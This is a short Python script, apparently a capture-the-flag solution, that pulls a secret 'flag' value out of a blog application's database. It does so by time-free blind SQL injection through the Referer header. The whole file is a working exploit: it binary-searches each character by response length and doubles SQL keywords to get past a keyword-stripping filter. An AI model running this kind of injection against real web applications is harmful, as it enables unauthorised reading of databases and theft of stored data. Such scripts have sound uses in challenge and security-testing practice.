#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

from requests import Session

from common import BASE_URL


url: str = f"{BASE_URL}/blog/single.php?id=1"
flag: str = ""

session: Session = Session()
for i in range(1, 100):
    left: int = 33
    right: int = 128

    while 1 != right - left:
        mid: int = (left + right) // 2
        payload: str = (
            f"0123'^if(substr((selselectect flag from flag),{i},1)>binary"
            f" {hex(mid)},(selecselectt 1+~0),0) ununionion selecselectt 1,2#"
        )
        headers: dict[str, str] = {"Referer": payload}

        session.headers.update(headers)
        resp = session.get(url=url)
        if len(resp.text) == 5596:
            left = mid
        else:
            right = mid

    flag += chr(right)

print(f"flag6: {flag}")
